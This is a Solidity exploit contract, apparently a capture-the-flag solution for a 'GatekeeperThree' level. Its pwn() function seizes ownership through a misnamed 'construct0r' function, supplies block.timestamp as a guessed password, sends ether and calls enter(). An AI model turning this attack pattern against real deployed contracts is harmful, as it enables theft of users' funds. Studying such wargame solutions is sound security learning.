// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface SimpleTrick {
    function checkPassword(uint _password) external returns (bool);
}

interface IGatekeeperThree{
    function enter() external;
    function construct0r() external;
    function createTrick() external;
    function trick() external view returns (address);
    function getAllowance(uint256 _password) external;
}

contract Hack {
    IGatekeeperThree gatekeeperThree;
    
    constructor (IGatekeeperThree _gatekeeperThree) {
        gatekeeperThree = _gatekeeperThree;
    }

    function pwn() external payable {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        // Send some ether: 2000000000000000 wei so it can be more than 0.001 ether
        // Similar to contract.sendTransaction({from:player,value: toWei("0.002"))
        (bool success, ) = payable(address(gatekeeperThree)).call{value: msg.value}("");
        require(success == true, "failed to send ether to gatekeeper three");

        gatekeeperThree.enter();
    }
}